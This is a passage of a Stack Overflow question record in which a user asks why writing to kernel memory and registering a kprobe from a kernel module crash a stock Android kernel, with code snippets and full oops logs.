"https://www.gravatar.com/avatar/20e78432a7b59e12783b4496f2d7bf2c?s=128&d=identicon&r=PG", "display_name": "csharpnewbie", "link": "https://stackoverflow.com/users/1164615/csharpnewbie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1193, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1437622040, "creation_date": 1437544601, "last_edit_date": 1437622040, "question_id": 31554937, "link": "https://stackoverflow.com/questions/31554937/memory-write-with-kernel-module-causes-kernel-oops-in-android-kernel", "title": "Memory write with kernel module causes kernel oops in Android kernel", "body": "<p>I am currently trying to debug the stock android kernel, but I encountered a few problems which I need help with. I have the source of the kernel, but I do not want to rebuild the kernel and flash into the phone, I only wish to carry out debugging on the stock kernel existing in my phone. Kprobes is enabled in the stock kernel (I confirmed this by looking at the list of symbols present at /proc/kallsyms).</p>\n\n<p>Firstly, I tried by compiling my own kernel module to manipulate the kernel memory. I am able to read from the memory by mapping the physical address to virtual address, and then assigning it to a pointer, like this:</p>\n\n<pre><code>unsigned char *my_ptr;\nmy_ptr = (unsigned char *)phys_to_virt((unsigned long)0x001C1D50);\nprintk(KERN_INFO \"%02X\", *my_ptr);\n</code></pre>\n\n<p>But when I tried to write to the memory using this: <code>my_ptr[0] = 0;</code>, the kernel goes into a panic(oops) state, and just restarts the phone. From /proc/last_kmsg, I get the following log:</p>\n\n<pre><code>&lt;3&gt;[  149.720085] RKP -&gt; Inst bf3db69c out of cpu_v7_set_pte_ext range from c01159c4 to c0115a1c\n&lt;1&gt;[  149.720233] Unable to handle kernel paging request at virtual address c01c1d50\n&lt;1&gt;[  149.720355] pgd = eb760000\n&lt;1&gt;[  149.720419] [c01c1d50] *pgd=0da00011\n&lt;0&gt;[  149.720658] Internal error: Oops: 80f [#1] PREEMPT SMP ARM\n&lt;4&gt;[  149.720749] Modules linked in: t_mod(O) wlan(PO) mhi(O)\n&lt;4&gt;[  149.720889] CPU: 0 PID: 5561 Comm: tmp-mksh Tainted: P        W  O 3.10.0-2413392 #1\n&lt;4&gt;[  149.721007] task: eba75400 ti: eb01a000 task.ti: eb01a000\n&lt;4&gt;[  149.721118] PC is at my_write+0x230/0x300 [t_mod]\n&lt;4&gt;[  149.721216] LR is at _kstrtoull+0x28/0x74\n&lt;4&gt;[  149.721298] pc : [&lt;bf3db69c&gt;]    lr : [&lt;c03cbf4c&gt;]    psr: 60010013\n&lt;4&gt;[  149.721298] sp : eb01be78  ip : 0000003f  fp : 00000000\n&lt;4&gt;[  149.721464] r10: 00000000  r9 : eb01a000  r8 : bf3dd270\n&lt;4&gt;[  149.721550] r7 : 00000005  r6 : 00000008  r5 : eb01be7c  r4 : eb01be86\n&lt;4&gt;[  149.721650] r3 : c01c1d48  r2 : 00000002  r1 : 00000000  r0 : 00000000\n&lt;4&gt;[  149.721754] Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user\n&lt;4&gt;[  149.721863] Control: 10c5787d  Table: 2b76006a  DAC: 00000015\n&lt;4&gt;[  149.721954] \n&lt;4&gt;[  149.721954] LR: 0xc03cbecc:\n&lt;4&gt;[  149.722038] becc  e00b3001 e1921003 0a000007 e3a01000 e1a04007 e1e00008 e1e01001 ebffbc2c\n&lt;4&gt;[  149.722235] beec  e153000b 0152000a 33a06001 e083279a e2855001 e0233b97 e092a008 e2a3b000\n&lt;4&gt;[  149.722439] bf0c  e7d93005 e3530000 1affffd8 eaffffde e1a00005 e8bd8ffe e92d407f e28d3010\n&lt;4&gt;[  149.722641] bf2c  e1a06002 e523100c e1a01003 ebffffa6 e59d1004 e28d2008 e1a04000 ebffffc2\n&lt;4&gt;[  149.722842] bf4c  e3500000 ba00000b e3d00102 0a00000b e7d42000 e0843000 e352000a 02833001\n&lt;4&gt;[  149.723043] bf6c  e5d30000 e3500000 1a000004 e1cd40d8 e1c640f0 ea000002 e3e00021 ea000000\n&lt;4&gt;[  149.723244] bf8c  e3e00015 e28dd010 e8bd8070 e5d03000 e353002b 02800001 eaffffde e92d4070\n&lt;4&gt;[  149.723444] bfac  e1a06003 e59f30bc e24dd048 e1a0e000 e3510042 31a04001 23a04042 e1a05002\n&lt;4&gt;[  149.723650] \n&lt;4&gt;[  149.723650] SP: 0xeb01bdf8:\n&lt;4&gt;[  149.723745] bdf8  00000000 ed77d74c eb01be86 eb01be38 eb01be38 eb01be86 eb01be7c eb01be50\n&lt;4&gt;[  149.723947] be18  bf3db69c 60010013 ffffffff eb01be64 bf3dd270 c0abd1d8 00000000 00000000\n&lt;4&gt;[  149.724147] be38  00000002 c01c1d48 eb01be86 eb01be7c 00000008 00000005 bf3dd270 eb01a000\n&lt;4&gt;[  149.724344] be58  00000000 00000000 0000003f eb01be78 c03cbf4c bf3db69c 60010013 ffffffff\n&lt;4&gt;[  149.724526] be78  00000000 eb01be89 00000002 3230ea28 20303000 31203030 e82b0041 eb01a000\n&lt;4&gt;[  149.724707] be98  00000800 00000000 c1219210 c024cfa4 eb01bebc e82ba000 00000002 eb7b7270\n&lt;4&gt;[  149.724888] beb8  6400742d 00000000 ea277e50 e8e7a7f8 ed77d74c c0192094 eba75400 eb01bf78\n&lt;4&gt;[  149.725069] bed8  00000001 e82ba000 ffffff9c c0106344 c036f940 00000002 e958e180 b85b0ab4\n&lt;4&gt;[  149.725255] \n&lt;4&gt;[  149.725255] R3: 0xc01c1cc8:\n&lt;4&gt;[  149.725339] 1cc8  e1a03007 e58db010 eb23c055 e3a01001 e5960008 eb0cee18 ebfd4d09 e1a01005\n&lt;4&gt;[  149.725523] 1ce8  e58d7000 e1a02007 e1a0300b e5960008 eb0cf40e e1a05000 e1a01004 e5960008\n&lt;4&gt;[  149.725706] 1d08  eb0cee0d e3550000 0a00000c e1a01005 e59f015c eb23c042 e59f0158 eb23c040\n&lt;4&gt;[  149.725887] 1d28  e2860008 eb0cf52e e3500000 05864008 0a00003a e59f0140 eb23c039 ea000037\n&lt;4&gt;[  149.726068] 1d48  e5981144 e3510000 00000000 e59f012c eb23c033 ea000032 e59f5124 e59f0124\n&lt;4&gt;[  149.726251] 1d68  eb23c02f e30810d0 e3a02010 e5950018 eb01e34a e2506000 1a000003 e59f1108\n&lt;4&gt;[  149.726451] 1d88  e59f0108 eb23c026 ea000024 e3a01010 e59f20fc e3e03000 eb081633 e5950020\n&lt;4&gt;[  149.726651] 1da8  e30810d0 e3a02c01 e58d6020 eb01e33b e2505000 1a000004 e59f00d0 e59f10c8\n&lt;4&gt;[  149.726857] \n&lt;4&gt;[  149.726857] R4: 0xeb01be06:\n&lt;4&gt;[  149.726950] be04  eb01be38 eb01be38 eb01be86 eb01be7c eb01be50 bf3db69c 60010013 ffffffff\n&lt;4&gt;[  149.727153] be24  eb01be64 bf3dd270 c0abd1d8 00000000 00000000 00000002 c01c1d48 eb01be86\n&lt;4&gt;[  149.727353] be44  eb01be7c 00000008 00000005 bf3dd270 eb01a000 00000000 00000000 0000003f\n&lt;4&gt;[  149.727552] be64  eb01be78 c03cbf4c bf3db69c 60010013 ffffffff 00000000 eb01be89 00000002\n&lt;4&gt;[  149.727751] be84  3230ea28 20303000 31203030 e82b0041 eb01a000 00000800 00000000 c1219210\n&lt;4&gt;[  149.727951] bea4  c024cfa4 eb01bebc e82ba000 00000002 eb7b7270 6400742d 00000000 ea277e50\n&lt;4&gt;[  149.728151] bec4  e8e7a7f8 ed77d74c c0192094 eba75400 eb01bf78 00000001 e82ba000 ffffff9c\n&lt;4&gt;[  149.728351] bee4  c0106344 c036f940 00000002 e958e180 b85b0ab4 eb01bf80 c03681d0 00000000\n&lt;4&gt;[  149.728534] bf04  ef00e400 00000001 b85b0ab4 00000001 c0241a04 00000020 a8279bb7 eb05dcbc\n&lt;4&gt;[  149.728719] \n&lt;4&gt;[  149.728719] R5: 0xeb01bdfc:\n&lt;4&gt;[  149.728803] bdfc  ed77d74c eb01be86 eb01be38 eb01be38 eb01be86 eb01be7c eb01be50 bf3db69c\n&lt;4&gt;[  149.728986] be1c  60010013 ffffffff eb01be64 bf3dd270 c0abd1d8 00000000 00000000 00000002\n&lt;4&gt;[  149.729166] be3c  c01c1d48 eb01be86 eb01be7c 00000008 00000005 bf3dd270 eb01a000 00000000\n&lt;4&gt;[  149.729347] be5c  00000000 0000003f eb01be78 c03cbf4c bf3db69c 60010013 ffffffff 00000000\n&lt;4&gt;[  149.729528] be7c  eb01be89 00000002 3230ea28 20303000 31203030 e82b0041 eb01a000 00000800\n&lt;4&gt;[  149.729710] be9c  00000000 c1219210 c024cfa4 eb01bebc e82ba000 00000002 eb7b7270 6400742d\n&lt;4&gt;[  149.729891] bebc  00000000 ea277e50 e8e7a7f8 ed77d74c c0192094 eba75400 eb01bf78 00000001\n&lt;4&gt;[  149.730072] bedc  e82ba000 ffffff9c c0106344 c036f940 00000002 e958e180 b85b0ab4 eb01bf80\n&lt;4&gt;[  149.730256] \n&lt;4&gt;[  149.730256] R9: 0xeb019f80:\n&lt;4&gt;[  149.730347] 9f80  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000\n&lt;4&gt;[  149.730544] 9fa0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000\n&lt;4&gt;[  149.730742] 9fc0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000\n&lt;4&gt;[  149.730939] 9fe0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000\n&lt;4&gt;[  149.731136] a000  00000200 00000001 00000000 eba75400 c1240d78 00000000 00000015 eba75400\n&lt;4&gt;[  149.731336] a020  c5151f00 eb01a000 c120df00 ed5fb500 00000000 ed2f1500 eb01be7c eb01bdf0\n&lt;4&gt;[  149.731538] a040  c0abba1c 00000000 00000000 00000004 00000000 00000000 01010000 00000000\n&lt;4&gt;[  149.731737] a060  b6f23f24 00000000 00000000 00000000 00000000 00000000 00000000 00000000\n&lt;0&gt;[  149.731944] Process tmp-mksh (pid: 5561, stack limit = 0xeb01a238)\n&lt;0&gt;[  149.732053] Stack: (0xeb01be78 to 0xeb01c000)\n&lt;0&gt;[  149.732145] be60:                                                       00000000 eb01be89\n&lt;0&gt;[  149.732295] be80: 00000002 3230ea28 20303000 31203030 e82b0041 eb01a000 00000800 00000000\n&lt;0&gt;[  149.732425] bea0: c1219210 c024cfa4 eb01bebc e82ba000 00000002 eb7b7270 6400742d 00000000\n&lt;0&gt;[  149.732554] bec0: ea277e50 e8e7a7f8 ed77d74c c0192094 eba75400 eb01bf78 00000001 e82ba000\n&lt;0&gt;[  149.732684] bee0: ffffff9c c0106344 c036f940 00000002 e958e180 b85b0ab4 eb01bf80 c03681d0\n&lt;0&gt;[  149.732812] bf00: 00000000 ef00e400 00000001 b85b0ab4 00000001 c0241a04 00000020 a8279bb7\n&lt;0&gt;[  149.732942] bf20: eb05dcbc eb05dc80 00000000 eb05dcbc 00000001 c0287c78 eb01bf80 e958e180\n&lt;0&gt;[  149.733071] bf40: 00000005 b85b0ab4 eb01bf80 b85b0ab4 00000005 c0240328 e958e180 b85b0ab4\n&lt;0&gt;[  149.733199] bf60: 00000005 00000000 00000000 e958e180 00000000 b85b0ab4 00000005 c0240680\n&lt;0&gt;[  149.733325] bf80: 00000000 00000000 00000005 00000003 00000005 00000001 00000004 c0106344\n&lt;0&gt;[  149.733454] bfa0: 00000200 c0106328 00000003 00000005 00000001 b85b0ab4 00000005 ffffffff\n&lt;0&gt;[  149.733580] bfc0: 00000003 00000005 00000001 00000004 b85b0ab4 00000000 00000000 00000000\n&lt;0&gt;[  149.733715] bfe0: 00000000 bef89528 b6f34d75 b6ed34ac 20010010 00000001 00000000 00000000\n&lt;4&gt;[  149.733918] [&lt;bf3db69c&gt;] (my_write+0x230/0x300 [t_mod]) from [&lt;c0287c78&gt;] (proc_reg_write+0x60/0x90)\n&lt;4&gt;[  149.734116] [&lt;c0287c78&gt;] (proc_reg_write+0x60/0x90) from [&lt;c0240328&gt;] (vfs_write+0xcc/0x174)\n&lt;4&gt;[  149.734288] [&lt;c0240328&gt;] (vfs_write+0xcc/0x174) from [&lt;c0240680&gt;] (SyS_write+0x38/0x64)\n&lt;4&gt;[  149.734457] [&lt;c0240680&gt;] (SyS_write+0x38/0x64) from [&lt;c0106328&gt;] (__sys_trace_return+0x0/0x18)\n&lt;0&gt;[  149.734617] Code: e3a01010 eb3fc49f e5983004 e59d2008 (e7c32006) \n&lt;4&gt;[  149.738191] ---[ end trace dec6997083161644 ]---\n&lt;0&gt;[  149.738295] Kernel panic - not syncing: Fatal exception\n</code></pre>\n\n<p>I thought that this had something to do with my kernel module, so I went ahead to use the kprobes function which are available in the kernel (mainly register_kprobe), like this:</p>\n\n<pre><code>static struct kprobe kp = {\n    .symbol_name    = \"do_fork\",\n    .pre_handler = handler_pre,\n    .post_handler = handler_post,\n    .fault_handler = handler_fault,\n};\n\nstatic int __init kprobe_init(void)\n{\n    int ret;    \n    ret = register_kprobe(&amp;kp);\n    if (ret &lt; 0) {\n        printk(KERN_INFO \"register_kprobe failed, returned %d\\n\", ret);\n        return ret;\n    }\n    printk(KERN_INFO \"Planted kprobe at %p\\n\", kp.addr);\n    return 0;\n}\n</code></pre>\n\n<p>The same thing happens when I inserted the kernel module with the above code, the kernel generates a panic(oops), and then it restarts the phone. The last_kmsg logged is around the same as the one I provided above. </p>\n\n<p>I would highly appreciate it if anyone who is familiar in this field can help me with the problem above. I would like to know whether if there is any memory protection implemented in the Android system. In a previous phone that I had, when /dev/mem is still implemented in the kernel, I am able to read/write memory through the driver as I wish. I have tried ioremap but it only returns NULL pointer. Thanks in advance!</p>\n\n<p>EDIT: sorry for the confusion above, i used 0x12345678 as an example, I get the addresses from /proc/kallsyms, and i translate it to a physical address. For example, if it's 0xc01c1d50, I will need to subtract 0xc0008000 from it, and since the kernel itself has a starting offset of 0x00008000, I will add it to the result, and hence it will be 0x001C1D50.</p>\n\n<p>Here's the /proc/last_kmsg output when I tried to register a kprobe with register_kprobe():</p>\n\n<pre><code>&lt;3&gt;[  184.769314] RKP -&gt; Inst c0abe2a0 out of cpu_v7_set_pte_ext range from c01159c4 to c0115a1c\n&lt;1&gt;[  184.769369] Unable to handle kernel paging request at virtual address c0170ce4\n&lt;1&gt;[  184.769416] pgd = dc828000\n&lt;1&gt;[  184.769439] [c0170ce4] *pgd=0da00011\n&lt;0&gt;[  184.769535] Internal error: Oops: 80f [#1] PREEMPT SMP ARM\n&lt;4&gt;[  184.769572] Modules linked in: kp_mod(O+) wlan(PO) mhi(O)\n&lt;4&gt;[  184.769620] CPU: 0 PID: 5835 Comm: insmod Tainted: P        W  O 3.10.0-2413392 #1\n&lt;4&gt;[  184.769665] task: ea0cf8c0 ti: de9a0000 task.ti: de9a0000\n&lt;4&gt;[  184.769706] PC is at __patch_text+0x24/0x3c\n&lt;4&gt;[  184.769734] LR is at __patch_text+0x1c/0x3c\n&lt;4&gt;[  184.769764] pc : [&lt;c0abe2a0&gt;]    lr : [&lt;c0abe298&gt;]    psr: 800f0093\n&lt;4&gt;[  184.769764] sp : de9a1df8  ip : 00000000  fp : 0000001c\n&lt;4&gt;[  184.769830] r10: e9a0b0c0  r9 : 00000000  r8 : bf3dd008\n&lt;4&gt;[  184.769862] r7 : 00000000  r6 : 00000000  r5 : e7f001f8  r4 : c0170ce4\n&lt;4&gt;[  184.769901] r3 : 0da00411  r2 : dc82b004  r1 : c0170ce4  r0 : c0170ce4\n&lt;4&gt;[  184.769942] Flags: Nzcv  IRQs off  FIQs on  Mode SVC_32  ISA ARM  Segment user\n&lt;4&gt;[  184.769984] Control: 10c5787d  Table: 1c82806a  DAC: 00000015\n&lt;4&gt;[  184.770019] \n&lt;4&gt;[  184.770019] PC: 0xc0abe220:\n&lt;4&gt;[  184.770049] e220  e12fff33 e8bd81f0 e592300c e3a00002 e5813004 e8bd81f0 e592300c e5813004\n&lt;4&gt;[  184.770116] e240  e5913000 e5830000 e3a00001 e8bd81f0 e1a00005 e8bd81f0 e1a0000c e8bd81f0\n&lt;4&gt;[  184.770186] e260  e3a00000 e8bd81f0 e1a0f00e c0b00714 dddddddd 22222222 00020103 e92d4037\n&lt;4&gt;[  184.770257] e280  e1a04000 e28d0004 e1a05001 ebd95615 e1a00004 ebd9561f e1a01004 e1a00004\n&lt;4&gt;[  184.770327] e2a0  e4815004 ebd95ba5 ebd95646 e28d0004 ebd95613 e8bd803e eaffffef e5902030\n&lt;4&gt;[  184.770398] e2c0  e5903014 e3c204ff e3120401 e1a00100 12832004 e2833008 e200c402 15812038\n&lt;4&gt;[  184.770468] e2e0  e26cc000 e18c0000 e0833000 e581303c e12fff1e e5903030 e5900014 e3c324ff\n&lt;4&gt;[  184.770538] e300  e1a03ba3 e280c004 e1a02102 e2800008 e581c038 e2033002 e202c402 e26cc000\n&lt;4&gt;[  184.770610] \n&lt;4&gt;[  184.770610] LR: 0xc0abe218:\n&lt;4&gt;[  184.770643] e218  eaffffb5 e592300c e12fff33 e8bd81f0 e592300c e3a00002 e5813004 e8bd81f0\n&lt;4&gt;[  184.770713] e238  e592300c e5813004 e5913000 e5830000 e3a00001 e8bd81f0 e1a00005 e8bd81f0\n&lt;4&gt;[  184.770784] e258  e1a0000c e8bd81f0 e3a00000 e8bd81f0 e1a0f00e c0b00714 dddddddd 22222222\n&lt;4&gt;[  184.770853] e278  00020103 e92d4037 e1a04000 e28d0004 e1a05001 ebd95615 e1a00004 ebd9561f\n&lt;4&gt;[  184.770919] e298  e1a01004 e1a00004 e4815004 ebd95ba5 ebd95646 e28d0004 ebd95613 e8bd803e\n&lt;4&gt;[  184.770982] e2b8  eaffffef e5902030 e5903014 e3c204ff e3120401 e1a00100 12832004 e2833008\n&lt;4&gt;[  184.771046] e2d8  e200c402 15812038 e26cc000 e18c0000 e0833000 e581303c e12fff1e e5903030\n&lt;4&gt;[  184.771110] e2f8  e5900014 e3c324ff e1a03ba3 e280c004 e1a02102 e2800008 e581c038 e2033002\n&lt;4&gt;[  184.771174] \n&lt;4&gt;[  184.771174] SP: 0xde9a1d78:\n&lt;4&gt;[  184.771204] 1d78  000002d0 ffffffff 00000000 e9a0b0c0 0000001c c0230b4c 00000001 dc804980\n&lt;4&gt;[  184.771268] 1d98  c0abe2a0 800f0093 ffffffff de9a1de4 bf3dd008 c0abd1d8 c0170ce4 c0170ce4\n&lt;4&gt;[  184.771332] 1db8  dc82b004 0da00411 c0170ce4 e7f001f8 00000000 00000000 bf3dd008 00000000\n&lt;4&gt;[  184.771395] 1dd8  e9a0b0c0 0000001c 00000000 de9a1df8 c0abe298 c0abe2a0 800f0093 ffffffff\n&lt;4&gt;[  184.771459] 1df8  c0170ce4 200f0013 de9a1e08 bf3dd000 bf3dd000 c0abf000 00000000 c0ac03d8\n&lt;4&gt;[  184.771522] 1e18  bf3dd04c bf3dd000 bf3dd058 00000001 bf3e0000 00000000 e9a0b0c0 bf3e0010\n&lt;4&gt;[  184.771589] 1e38  de9a0000 bf3dd04c de9a1f58 c010065c bf3e1000 00000001 ffffffff 00000000\n&lt;4&gt;[  184.771659] 1e58  bf3e2000 00000002 bf3e0000 bf3dd04c de9a1f58 bf3dd058 00000001 bf3dd094\n&lt;4&gt;[  184.771730] \n&lt;4&gt;[  184.771730] R0: 0xc0170c64:\n&lt;4&gt;[  184.771763] 0c64  eafffe41 e1a00004 e28dd01c e8bd8ff0 20000100 c1443500 003000d0 c12f4a00\n&lt;4&gt;[  184.771834] 0c84  57ac6e9d c1242858 c0ebd7ae c01779ec c0ebd7c2 c1443524 c0ebd7d4 c12f83bc\n&lt;4&gt;[  184.771905] 0ca4  c0ebd7eb c1242fe0 c1212040 c0ebb032 c1220cb8 c120a758 c12f8744 e1a0200d\n&lt;4&gt;[  184.771975] 0cc4  e3a01000 e3c23d7f e3c3303f e593200c e58202e8 e593000c e1a02001 ea007583\n&lt;4&gt;[  184.772045] 0ce4  e3100203 e92d45f0 e1a05000 e24dd01c e1a08003 0a000001 e3100906 1a0000ba\n&lt;4&gt;[  184.772115] 0d04  e3150502 13a06000 1a000011 e3150901 13a06002 1a000004 e6ef6075 e3560011\n&lt;4&gt;[  184.772185] 0d24  03a06001 13a06003 eaffffff e1a0c00d e2860003 e3cc3d7f e3a0c001 e3c3303f\n&lt;4&gt;[  184.772255] 0d44  e593300c e5933010 e013301c 03a06000 eaffffff e59f32c4 e59f02c0 e0053003\n&lt;4&gt;[  184.772323] \n&lt;4&gt;[  184.772323] R1: 0xc0170c64:\n&lt;4&gt;[  184.772353] 0c64  eafffe41 e1a00004 e28dd01c e8bd8ff0 20000100 c1443500 003000d0 c12f4a00\n&lt;4&gt;[  184.772417] 0c84  57ac6e9d c1242858 c0ebd7ae c01779ec c0ebd7c2 c1443524 c0ebd7d4 c12f83bc\n&lt;4&gt;[  184.772481] 0ca4  c0ebd7eb c1242fe0 c1212040 c0ebb032 c1220cb8 c120a758 c12f8744 e1a0200d\n&lt;4&gt;[  184.772544] 0cc4  e3a01000 e3c23d7f e3c3303f e593200c e58202e8 e593000c e1a02001 ea007583\n&lt;4&gt;[  184.772608] 0ce4  e3100203 e92d45f0 e1a05000 e24dd01c e1a08003 0a000001 e3100906 1a0000ba\n&lt;4&gt;[  184.772671] 0d04  e3150502 13a06000 1a000011 e3150901 13a06002 1a000004 e6ef6075 e3560011\n&lt;4&gt;[  184.772735] 0d24  03a06001 13a06003 eaffffff e1a0c00d e2860003 e3cc3d7f e3a0c001 e3c3303f\n&lt;4&gt;[  184.772799] 0d44  e593300c e5933010 e013301c 03a06000 eaffffff e59f32c4 e59f02c0 e0053003\n&lt;4&gt;[  184.772863] \n&lt;4&gt;[  184.772863] R2: 0xdc82af84:\n&lt;4&gt;[  184.772893] af84  00000000 00000000 00000000 00000000 00000000 00000000 00000000 2b57f835\n&lt;4&gt;[  184.772956] afa4  2b57fc35 00000000 00000000 00000000 00000000 00000000 00000000 2c501811\n&lt;4&gt;[  184.773025] afc4  2c501c11 2a5ad811 2a5adc11 2a61e811 2a61ec11 00000000 00000000 00000000\n&lt;4&gt;[  184.773094] afe4  00000000 00000000 00000000 00000000 00000000 304f2811 304f2c11 0da00011\n&lt;4&gt;[  184.773163] b004  0da00411 0021940e 0031940e 0041940e 0051940e 0061940e 0071940e 0081940e\n&lt;4&gt;[  184.773233] b024  0091940e 00a1940e 0da00811 0da00c11 0da01011 0da01411 0da01811 0da01c11\n&lt;4&gt;[  184.773303] b044  0da02011 0da02411 0da02811 0da02c11 0da03011 0da03411 0da03811 0da03c11\n&lt;4&gt;[  184.773373] b064  0da04011 0da04411 0da04811 0da04c11 0da05011 0da05411 0da05811 0da05c11\n&lt;4&gt;[  184.773445] \n&lt;4&gt;[  184.773445] R4: 0xc0170c64:\n&lt;4&gt;[  184.773478] 0c64  eafffe41 e1a00004 e28dd01c e8bd8ff0 20000100 c1443500 003000d0 c12f4a00\n&lt;4&gt;[  184.773549] 0c84  57ac6e9d c1242858 c0ebd7ae c01779ec c0ebd7c2 c1443524 c0ebd7d4 c12f83bc\n&lt;4&gt;[  184.773619] 0ca4  c0ebd7eb c1242fe0 c1212040 c0ebb032 c1220cb8 c120a758 c12f8744 e1a0200d\n&lt;4&gt;[  184.773690] 0cc4  e3a01000 e3c23d7f e3c3303f e593200c e58202e8 e593000c e1a02001 ea007583\n&lt;4&gt;[  184.773754] 0ce4  e3100203 e92d45f0 e1a05000 e24dd01c e1a08003 0a000001 e3100906 1a0000ba\n&lt;4&gt;[  184.773817] 0d04  e3150502 13a06000 1a000011 e3150901 13a06002 1a000004 e6ef6075 e3560011\n&lt;4&gt;[  184.773881] 0d24  03a06001 13a06003 eaffffff e1a0c00d e2860003 e3cc3d7f e3a0c001 e3c3303f\n&lt;4&gt;[  184.773944] 0d44  e593300c e5933010 e013301c 03a06000 eaffffff e59f32c4 e59f02c0 e0053003\n&lt;4&gt;[  184.774009] \n&lt;4&gt;[  184.774009] R5: 0xe7f00178:\n&lt;4&gt;[  184.774039] 0178  000406ab 0000d2ab 06ae06ac 0000cd09 06ae06ad 0000cd09 1cbd06ae 0000957c\n&lt;4&gt;[  184.774104] 0198  058006ae 00009595 048106ae 00009596 04fb06ae 00009597 04fb06ae 00009598\n&lt;4&gt;[  184.774168] 01b8  04fb06ae 00009599 080106ae 000096e5 07c306ae 000097c9 00ec06ae 00009813\n&lt;4&gt;[  184.774231] 01d8  050206ae 00009852 067606ae 00009859 1dd806ae 000098ec 04fb06ae 00009b4e\n&lt;4&gt;[  184.774294] 01f8  18a606ae 00009c0f 058006ae 00009c10 0bdc06ae 00009c62 1c2706ae 00009ca0\n&lt;4&gt;[  184.774358] 0218  1e5a06ae 0000a03a 1dd806ae 0000a210 058006ae 0000a288 058006ae 0000a289\n&lt;4&gt;[  184.774427] 0238  0d4806af 00009850 056306af 00009b3f 04f206af 00009cc3 000406af 0000a023\n&lt;4&gt;[  184.774497] 0258  1e5a06af 0000a03a 073406b0 0000957b 005306b2 000095b4 080206b2 000096c6\n&lt;4&gt;[  184.774568] \n&lt;4&gt;[  184.774568] R10: 0xe9a0b040:\n&lt;4&gt;[  184.774602] b040  e9a0b680 e9a0b044 e9a0b044 bf3dd094 00000000 c12611f4 dc804840 00000001\n&lt;4&gt;[  184.774673] b060  00000003 00000000 00000000 00000000 00000000 00000000 00000000 00000000\n&lt;4&gt;[  184.774742] b080  000136ad eba6ec05 eaee9984 ea766f84 c329f811 deb3c7d0 ea9b0b10 00000000\n&lt;4&gt;[  184.774812] b0a0  debf6ba0 e9fd2a00 debf6b80 000001c9 00000001 00000001 00000000 00000000\n&lt;4&gt;[  184.774882] b0c0  e9a0b040 00000001 eb9600c0 00000124 00000024 bf3dc0c4 c01c1f6c 00000000\n&lt;4&gt;[  184.774952] b0e0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000\n&lt;4&gt;[  184.775021] b100  00000001 00000000 eb960fc0 eb9600c0 eb960b50 00000000 00000000 00000000\n&lt;4&gt;[  184.775091] b120  00000000 5499790f e9824578 00000000 00000000 81240002 00001c0d 00000000\n&lt;0&gt;[  184.775159] Process insmod (pid: 5835, stack limit = 0xde9a0238)\n&lt;0&gt;[  184.775195] Stack: (0xde9a1df8 to 0xde9a2000)\n&lt;0&gt;[  184.775225] 1de0:                                                       c0170ce4 200f0013\n&lt;0&gt;[  184.775275] 1e00: de9a1e08 bf3dd000 bf3dd000 c0abf000 00000000 c0ac03d8 bf3dd04c bf3dd000\n&lt;0&gt;[  184.775324] 1e20: bf3dd058 00000001 bf3e0000 00000000 e9a0b0c0 bf3e0010 de9a0000 bf3dd04c\n&lt;0&gt;[  184.775373] 1e40: de9a1f58 c010065c bf3e1000 00000001 ffffffff 00000000 bf3e2000 00000002\n&lt;0&gt;[  184.775422] 1e60: bf3e0000 bf3dd04c de9a1f58 bf3dd058 00000001 bf3dd094 00000001 e9a0b0c0\n&lt;0&gt;[  184.775472] 1e80: 0000001c c01c524c bf3dd058 00007fff c03d6a48 c023007c de9a0000 00000028\n&lt;0&gt;[  184.775521] 1ea0: 00000000 c01c1ff4 00000000 c1218444 bf3dd1a0 00000041 c0b093fc f09ddd90\n&lt;0&gt;[  184.775570] 1ec0: de9a1edc be8c93c4 de9a1f0c c1055198 00000000 00000000 00000000 00000000\n&lt;0&gt;[  184.775619] 1ee0: 00000000 00000000 6e72656b 00006c65 00000000 00000000 00000000 00000000\n&lt;0&gt;[  184.775669] 1f00: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000\n&lt;0&gt;[  184.775724] 1f20: 00000000 a8279bb7 000000d2 b6d3f008 00015a68 be8c93c4 00000080 c0106344\n&lt;0&gt;[  184.775780] 1f40: de9a0000 00000200 00015a68 c01c5670 00000080 00000080 f09cd000 00015a68\n&lt;0&gt;[  184.775836] 1f60: f09dd700 f09dd54a f09e2940 00003000 00003130 00000000 00000000 00000000\n&lt;0&gt;[  184.775892] 1f80: 0000002a 0000002b 00000015 00000012 00000010 00000000 00015a68 b6d3f008\n&lt;0&gt;[  184.775948] 1fa0: b6f7fc74 c0106328 00015a68 b6d3f008 b6d3f008 00015a68 be8c93c4 00000000\n&lt;0&gt;[  184.776004] 1fc0: 00015a68 b6d3f008 b6f7fc74 00000080 be8c9844 00000038 00000002 00015a68\n&lt;0&gt;[  184.776059] 1fe0: 00000004 be8c9348 b6f66785 b6efc7f0 600b0010 b6d3f008 00000000 00000000\n&lt;4&gt;[  184.776127] [&lt;c0abe2a0&gt;] (__patch_text+0x24/0x3c) from [&lt;c0abf000&gt;] (arm_kprobe+0x24/0x34)\n&lt;4&gt;[  184.776188] [&lt;c0abf000&gt;] (arm_kprobe+0x24/0x34) from [&lt;c0ac03d8&gt;] (register_kprobe+0x4f0/0x58c)\n&lt;4&gt;[  184.776256] [&lt;c0ac03d8&gt;] (register_kprobe+0x4f0/0x58c) from [&lt;bf3e0010&gt;] (kprobe_init+0x10/0x1000 [kp_mod])\n&lt;4&gt;[  184.776325] [&lt;bf3e0010&gt;] (kprobe_init+0x10/0x1000 [kp_mod]) from [&lt;c010065c&gt;] (do_one_initcall+0xcc/0x180)\n&lt;4&gt;[  184.776391] [&lt;c010065c&gt;] (do_one_initcall+0xcc/0x180) from [&lt;c01c524c&gt;] (load_module+0x1c98/0x1fc0)\n&lt;4&gt;[  184.776450] [&lt;c01c524c&gt;] (load_module+0x1c98/0x1fc0) from [&lt;c01c5670&gt;] (SyS_init_module+0xfc/0x11c)\n&lt;4&gt;[  184.776508] [&lt;c01c5670&gt;] (SyS_init_module+0xfc/0x11c) from [&lt;c0106328&gt;] (__sys_trace_return+0x0/0x18)\n&lt;0&gt;[  184.776563] Code: e1a00004 ebd9561f e1a01004 e1a00004 (e4815004) \n&lt;4&gt;[  184.776608] 